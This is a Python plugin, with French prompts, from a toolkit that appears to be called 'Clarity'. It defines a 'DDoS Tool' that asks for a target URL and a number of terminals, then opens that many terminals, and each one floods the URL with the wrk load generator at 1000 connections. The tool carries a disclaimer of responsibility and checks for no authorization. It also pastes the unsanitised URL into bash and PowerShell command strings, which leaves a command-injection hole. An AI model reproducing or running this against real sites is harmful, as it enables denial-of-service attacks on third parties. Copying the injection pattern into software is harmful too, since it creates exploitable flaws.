import subprocess
import platform
import os
import shutil
from clarity.core import ClarityTool, Colors, soft_input


class DDOS(ClarityTool):
    """Un outil de test de charge DDoS utilisant wrk."""

    TITLE = "DDoS Tool"
    DESCRIPTION = "Un outil pour effectuer des tests de charge DDoS sur une URL donnée.[Added via plugin, no auto install yet]"

    def __init__(self):
        super().__init__(options=[
            ("Lancer DDoS", self.DDOS)
        ], installable=False, runnable=True)

    def DDOS(self):
        print(f"{Colors.RED}Je ne suis pas responsable de ce que vous faites avec cette outils{Colors.RESET}")
        nb_str = soft_input(f"{Colors.CYAN}Quelle est le nombre de terminal ouvert? (seulement le chiffre svp){Colors.RESET}")
        try:
            nb = int(nb_str)
        except ValueError:
            print(f"{Colors.RED}Veuillez entrer un nombre valide.{Colors.RESET}")
            return
        URL = soft_input(f"{Colors.BLUE}URL? (avec http.s): {Colors.RESET}")
        cmd = f"wrk -t171 -c1000 -d40 {URL}"
        systeme = platform.system()

        for _ in range(nb):
            if systeme == "Windows":
                subprocess.Popen([
                    "powershell", "-Command",
                    f"Start-Process cmd -ArgumentList '/c wsl -- bash -c \"{cmd}; exec bash\"'"
                ])
            elif systeme == "Linux":
                # Détection de terminal Linux
                if shutil.which("gnome-terminal"):
                    subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"{cmd}; exec bash"])
                elif shutil.which("xfce4-terminal"):
                    subprocess.Popen(["xfce4-terminal", "--command", f"bash -c '{cmd}; exec bash'"])
                elif shutil.which("xterm"):
                    subprocess.Popen(["xterm", "-e", f"{cmd}; bash"])
                else:
                    print("Aucun terminal compatible")
            else:
                print(f"Système non supporté : {systeme}")
